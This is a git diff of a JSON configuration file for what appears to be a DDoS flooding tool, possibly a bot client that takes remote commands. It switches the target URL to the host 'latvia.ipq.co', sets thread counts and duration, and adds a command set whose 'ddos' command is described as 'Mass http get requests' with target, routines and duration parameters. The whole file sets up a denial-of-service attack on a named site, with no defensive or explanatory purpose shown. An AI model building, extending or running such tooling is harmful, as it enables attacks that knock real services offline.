@@ -1,6 +1,48 @@
 {
-  "url": "http://ddos.me/",
+  "url": "http://latvia.ipq.co/",
   "requests": 0,
-  "routines": 1000,
-  "seconds": 10
+  "routines": 3,
+  "seconds": 5,
+  "commands":[
+    {
+      "id": 0,
+      "command": "stop",
+      "description": "Stop and quit",
+      "params": []
+    },
+    {
+      "id": 1,
+      "command": "pause",
+      "description": "Pause the current operation",
+      "params": []
+    },
+    {
+      "id": 2,
+      "command": "resume",
+      "description": "Resume the current operation",
+      "params": []
+    },
+    {
+      "id": 3,
+      "command": "ddos",
+      "description": "Mass http get requests",
+      "params": [
+        {
+          "param": "url",
+          "type": "string",
+          "description": "Target"
+        },
+        {
+          "param": "routines",
+          "type": "int",
+          "description": "Routines per app"
+        },
+        {
+          "param": "seconds",
+          "type": "int",
+          "description": "Duration of work"
+        }
+      ]
+    }
+  ]
 }
